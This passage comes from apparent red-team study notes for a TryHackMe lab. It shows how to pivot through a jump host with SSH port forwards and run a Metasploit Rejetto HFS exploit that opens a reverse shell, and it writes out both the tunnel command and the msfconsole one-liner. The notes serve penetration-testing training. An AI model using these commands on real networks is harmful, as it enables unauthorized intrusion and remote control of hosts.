- With this in mind, we could use SSH to forward some ports from the attacker's machine to THMJMP2 (SRVPORT for the web server and LPORT to receive the reverse shell) and pivot through THMJMP2 to reach RPORT on THMDC. We would need to do three port forwards in both directions so that all the exploit's interactions can be proxied through THMJMP2:
  ![Rejetto HFS exploit plan](/resources_redteam/rejetto_hfs_plan.png)
- Rejetto HFS will be listening on port 80 on THMDC, so we need to tunnel that port back to our attacker's machine through THMJMP2 using remote port forwarding. 
- Use free port on attacker machine, lets say 8888. When running ssh in THMJMP2 to forward this port, we would have to add `-R 8888:thmdc.za.tryhackme.com:80` to our command.
- For SRVPORT and LPORT, let's choose two random ports at will. For demonstrative purposes, we'll set SRVPORT=6666 and LPORT=7878, but be sure to use different ports as the lab is shared with other students, so if two of you choose the same ports, when trying to forward them, you'll get an error stating that such port is already in use on THMJMP2.
- To forward such ports from our attacker machine to THMJMP2, we will use local port forwarding by adding `-L *:6666:127.0.0.1:6666` and `-L *:7878:127.0.0.1:7878` to our ssh command. This will bind both ports on THMJMP2 and tunnel any connection back to our attacker machine.
- Putting the whole command together, we would end up with the following:
```powershell
ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
```
- Once all port forwards in place, we can start Metasploit and configure the exploit so that the required ports match the ones we have forwarded through THMJMP2:
```bash
msfconsole -q -x "use rejetto_hfs_exec; set payload windows/shell_reverse_tcp; set lhost thmjmp2.za.tryhackme.com; set ReverseListenerBindAddress 127.0.0.1; set lport 7878; set srvhost 127.0.0.1; set srvport 6666; set rhosts 127.0.0.1; set rport 8888; exploit"
```

## 7. Conclusion
- In this, we have discussed the many ways an attacker can move around a network once they have a set of valid credentials. From an attacker's perspective, having as many different techniques as possible to perform lateral movement will always be helpful as different networks will have various restrictions in place that may or may not block some of the methods.

- While we have presented the most common techniques in use, remember that anything that allows you to move from one host to another is lateral movement. Depending on the specifics of each network, other paths could be viable.

Should you be interested in more tools and techniques, the following resources are available:

[Sshuttle](https://github.com/sshuttle/sshuttle)
[Rpivot](https://github.com/klsecservices/rpivot)
[Chisel](https://github.com/jpillora/chisel)
[Hijacking Sockets with Shadowmove](https://adepts.of0x.cc/shadowmove-hijack-socket/)
